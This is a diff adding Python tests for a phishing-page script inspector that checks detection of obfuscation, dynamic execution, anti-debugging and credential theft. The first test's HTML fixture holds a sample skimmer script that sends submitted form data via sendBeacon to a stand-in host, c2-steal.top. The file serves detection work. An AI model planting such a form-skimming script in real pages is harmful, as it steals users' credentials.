@@ -175,3 +175,79 @@ def test_analyze_quarantined_artifacts(tmp_path):
     assert len(summary["wasm_modules"]) == 1
     assert summary["risk_level"] in ("HIGH", "CRITICAL")
 
+
+def test_script_inspector_obfuscated(tmp_path):
+    from re_engine import ScriptInspector
+
+    html = """
+    <html>
+      <head>
+        <script>
+          var _0xabc123 = ["\\x65\\x76\\x61\\x6c", "\\x73\\x75\\x62\\x6d\\x69\\x74"];
+          eval(String.fromCharCode(97, 108, 101, 114, 116));
+          document.forms[0].addEventListener("submit", function(e) {
+            navigator.sendBeacon("https://c2-steal.top/harvest", new FormData(this));
+          });
+          debugger;
+        </script>
+      </head>
+      <body>Phish</body>
+    </html>
+    """
+    dom_file = tmp_path / "dom_snapshot.html"
+    dom_file.write_text(html)
+
+    inspector = ScriptInspector(dom_file)
+    res = inspector.analyze()
+
+    assert res["has_scripts"] is True
+    assert res["is_packed"] is True
+    assert res["is_suspicious"] is True
+    assert any("Dynamic Execution" in c for c in res["capabilities"])
+    assert any("Obfuscation" in c for c in res["capabilities"])
+    assert any("Credential" in c for c in res["capabilities"])
+    assert any("Anti-Analysis" in c for c in res["capabilities"])
+    assert any("c2-steal.top" in u for u in res["iocs"])
+
+
+def test_script_inspector_clean(tmp_path):
+    from re_engine import ScriptInspector
+
+    html = """
+    <html>
+      <head>
+        <script>
+          console.log("Welcome to official Vercel login");
+          window.trackMetric = function(n, v) { return n + v; };
+        </script>
+      </head>
+      <body>Safe</body>
+    </html>
+    """
+    dom_file = tmp_path / "dom_snapshot.html"
+    dom_file.write_text(html)
+
+    inspector = ScriptInspector(dom_file)
+    res = inspector.analyze()
+
+    assert res["has_scripts"] is True
+    assert res["is_packed"] is False
+    assert res["is_suspicious"] is False
+    assert len(res["capabilities"]) == 0
+
+
+def test_default_rea_execution_on_empty_job(tmp_path):
+    from re_engine import analyze_target_artifacts
+
+    job_dir = tmp_path / "clean_job"
+    job_dir.mkdir()
+    (job_dir / "dom_snapshot.html").write_text("<html><body>No scripts here</body></html>")
+
+    report = analyze_target_artifacts(job_dir)
+    assert report["has_disassembly"] is True  # Always True by default
+    assert report["has_quarantined_artifacts"] is False
+    assert len(report["artifacts"]) >= 1
+    assert report["artifacts"][0]["name"] == "client_dom_scripts.js"
+    assert report["risk_level"] == "LOW"
+
+
